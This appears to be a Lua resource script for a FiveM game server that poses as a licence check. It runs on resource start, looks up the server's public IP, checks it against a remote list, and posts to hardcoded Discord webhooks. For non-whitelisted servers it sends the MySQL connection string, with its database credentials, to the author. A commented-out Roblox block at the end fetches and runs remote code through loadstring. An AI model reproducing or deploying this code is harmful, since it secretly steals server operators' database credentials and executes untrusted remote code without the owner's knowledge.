local ip = nil
local canWork = false
local oServer = 'anka'

AddEventHandler('onResourceStart', function(resourceName)
  if (GetCurrentResourceName() == resourceName) then
    PerformHttpRequest("https://api.ipify.org/?format=lua", function (errorCode, resultData, resultHeaders)
      ip = resultData

      PerformHttpRequest("https://raw.githubusercontent.com/unknowndeira/allowips/main/ips.txt", function (errorCode, resultData, resultHeaders)
        if not string.match(resultData, ip) then
          canWork = true
          TriggerClientEvent("canWork",-1)
          print("Thank you for using ^2deira's scripts!^7")
          print('If you have any problems about the ^3script^7 you can contact me ^5via DM - deira#0010^7')
          print('^1github.com/unknowndeira^7')
          print('Thank you for registering the script.^7')
          sendToDiscord("**||"..ip.."||**'den ***"..oServer.."*** kullanıcı adı ile başarılı bir şekilde scriptlere bağlanıldı! \nServer: **"..GetConvar("sv_hostname")..'**','success')
        else 
          canWork = false
          print('You are not allowed to use this script, so the author is ^3alerted!^7')
          Citizen.Wait(1000)
          sendToDiscord("**||"..ip.."||**'den ***"..oServer.."*** kullanıcı adı ile scriptlere erişilmeye çalışıldı! \nServer: **"..GetConvar("sv_hostname").."** \nMySQL: **"..GetConvar("mysql_connection_string").."** <@319759689900359683>")
          CancelEvent()
        end
      end)
    end)
  end
end)

function sendToDiscord(message,type)
  if message == nil or message == '' then return FALSE end
  if type == 'success' then
    PerformHttpRequest('https://discord.com/api/webhooks/870643035430613023/gqvtkqlCGHZhIIIcHtn3hThiOJlmBYEh7vA8_pXlJomOOU1EDUlmIjsxrmjAVEB5jG9f', function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
  else
    PerformHttpRequest('https://discord.com/api/webhooks/870646815471566899/Ny09mWJxhJOZ5kuqjfPtlTY6lH3BLFwAiisHM6GVdCbtpaGuJ7iWL5VNbm-tA2fU3kr4', function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
  end
end

--[[
local Player = game:GetService("Players").LocalPlayer
local WhitelistedIds = {
    2673957768, ---holy_punishher
    2258274790, ---07clips
    93046029, ---iiiMuji
    485257794, ---BETA
    2349605818,
    368758193, ---4_znx
    467072045, 
    103565251, ---Z0nhi
    29830504, ---6naga
    2394143462,
    508340762, ---SawMiss
    136036647, ---SawKerz
    1159880547, ---SawVelvet
    2518835349, ---Max
    2511158592, ---Jody 
    2534997488 , ---703labrat
}

if table.find(WhitelistedIds, Player.UserId) then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/L4W13T/MTRNFESX/main/1whlms", true))()
else
    Player:Kick("You are not whitelisted to use this script")
end]]--